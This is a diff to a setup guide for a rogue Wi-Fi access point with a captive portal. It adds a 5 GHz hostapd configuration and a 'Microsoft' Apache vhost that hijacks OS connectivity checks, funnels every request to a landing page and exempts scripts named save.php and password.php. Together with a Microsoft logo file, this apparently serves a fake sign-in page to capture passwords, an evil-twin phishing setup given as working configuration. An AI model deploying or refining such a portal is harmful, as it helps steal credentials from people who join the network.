@@ -53,7 +53,7 @@ address=/www.msftconnecttest.com/192.168.50.1
 address=/connectivitycheck.gstatic.com/192.168.50.1
 ```
 
-### 4) configure hostapd.conf file:
+### 4.A) configure hostapd.conf file (2.4 GHz):
 ```bash
 interface=wlan0
 driver=nl80211
@@ -62,6 +62,17 @@ hw_mode=g
 channel=6
 auth_algs=1
 wmm_enabled=0
+```
+
+### 4.B) configure hostapd.conf file (5 GHz):
+```bash
+interface=wlan0
+driver=nl80211
+ssid=TestNetworkName 
+hw_mode=a
+channel=36
+auth_algs=1
+wmm_enabled=1
 ```
 
 ### 5) configure a2enmod:
@@ -94,7 +105,39 @@ sudo chown www-data:www-data /var/log/ca.log
 sudo chmod 640 /var/log/ca.log
 ```
 
-### 9) Create Vhost:
+### 9.A) Create Vhost (default):
+```bash
+nano /etc/apache2/sites-available/captive.conf
+```
+
+```bash
+<VirtualHost *:80>
+    ServerName captive.portal
+    ServerAlias *
+    DocumentRoot /var/www/captive
+    <Directory /var/www/captive>
+        AllowOverride All
+        Require all granted
+    </Directory>
+
+    # iOS/macOS
+    Alias /hotspot-detect.html /var/www/captive/index.html
+    # Android
+    Alias /generate_204 /var/www/captive/index.html
+    # Windows
+    Alias /connecttest.txt /var/www/captive/index.html
+
+    RewriteEngine On
+    RewriteCond %{REQUEST_URI} !^/save\.php$
+    RewriteRule ^.*$ /index.html [L]
+
+    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+    Header always set Pragma "no-cache"
+    Header always set Expires "0"
+</VirtualHost>
+```
+
+### 9.B) Create Vhost (Microsoft):
 ```bash
 nano /etc/apache2/sites-available/captive.conf
 ```
@@ -105,28 +148,29 @@ nano /etc/apache2/sites-available/captive.conf
     ServerAlias *
     DocumentRoot /var/www/captive
 
-
     <Directory /var/www/captive>
-        AllowOverride All
+        AllowOverride None
         Require all granted
+        Options -MultiViews
     </Directory>
 
- 
-    # iOS/macOS
     Alias /hotspot-detect.html /var/www/captive/index.html
-    # Android
-    Alias /generate_204 /var/www/captive/index.html
-    # Windows
-    Alias /connecttest.txt /var/www/captive/index.html
+    Alias /generate_204       /var/www/captive/index.html
+    Alias /connecttest.txt    /var/www/captive/index.html
 
-   
     RewriteEngine On
-    RewriteCond %{REQUEST_URI} !^/save\.php$
-    RewriteRule ^.*$ /index.html [L]
+    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
+    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]
 
+    RewriteCond %{REQUEST_FILENAME} -f [OR]
+    RewriteCond %{REQUEST_FILENAME} -d
+    RewriteRule ^ - [L]
+    RewriteRule ^ /index.html [L]
     Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
     Header always set Pragma "no-cache"
     Header always set Expires "0"
+    Header always set X-VHost "captive-portal"
+    AddType image/svg+xml .svg .svgz
 </VirtualHost>
 ```
 
